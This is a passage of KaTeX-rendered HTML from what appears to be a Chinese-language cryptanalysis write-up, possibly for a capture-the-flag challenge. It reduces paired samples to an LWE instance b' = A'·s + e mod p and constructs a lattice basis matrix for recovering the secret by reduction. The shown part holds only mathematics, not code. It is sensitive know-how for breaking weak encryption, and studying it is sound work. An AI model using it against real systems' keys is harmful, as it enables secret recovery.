op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令，</mtext><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>≡</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">令，A&#x27;_{i,j}\equiv A_{i,j,1}-A_{i,j,0}\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.383108em;"></span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>有，</mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>≡</mo><mrow><mo fence="true">(</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⋅</mo><msub><mi>s</mi><mi>j</mi></msub><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">有，b&#x27;_i \equiv \left( \sum_{j=0}^{n-1} A&#x27;_{i, j} \cdot s_j + e_i \right) \pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>可看做，</mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>≡</mo><msubsup><mi>A</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⋅</mo><msub><mi>s</mi><mi>j</mi></msub><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">可看做，b&#x27;_{i}\equiv A&#x27;_{i}\cdot s_{j}+e_{i} \pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">做</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>有，</mtext><msubsup><mi>A</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⋅</mo><msub><mi>s</mi><mi>j</mi></msub><mo>−</mo><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><mo>−</mo><msub><mi>e</mi><mi>i</mi></msub><mo>+</mo><msub><mi>K</mi><mi>i</mi></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">有，A&#x27;_{i}\cdot s_{j}-b&#x27;_{i}=-e_{i}+K_{i}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>构造下面这个</mtext><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>维的格的基矩阵</mtext><mi>L</mi><mtext>：</mtext></mrow><annotation encoding="application/x-tex">构造下面这个 (n+m+1)×(n+m+1) 维的格的基矩阵 L：</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">维</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">：</span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi mathvariant="bold">I</mi><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msup><mi mathvariant="bold">A</mi><mo mathvariant="bold" lspace="0em" rspace="0em">′</mo></msup><msubsup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>×</mo><mi>m</mi></mrow><mi>T</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>n</mi><mo>×</mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mo>⋅</mo><msub><mi mathvariant="bold">I</mi><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>m</mi><mo>×</mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mn>1</mn><mo>×</mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mo stretchy="false">(</mo><msup><mi mathvariant="bold">b</mi><mo mathvariant="bold" lspace="0em" rspace="0em">′</mo></msup><msubsup><mo stretchy="false">)</mo><mrow><mn>1</mn><mo>×</mo><mi>m</mi></mrow><mi>T</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L = \begin{pmatrix} \mathbf{I}_{n \times n} &amp; (\mathbf{A&#x27;})_{n \times m}^T &amp; \mathbf{0}_{n \times 1} \\ \mathbf{0}_{m \times n} &amp; p \cdot \mathbf{I}_{m \times m} &amp; \mathbf{0}_{m \times 1} \\ \mathbf{0}_{1 \times n} &amp; -(\mathbf{b&#x27;})^T_{1 \times m} &amp; 1 \\ \end{pmatrix} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6026619999999996em;vertical-align:-1.5513309999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M291 0 H417 V300 H291 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">I</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span 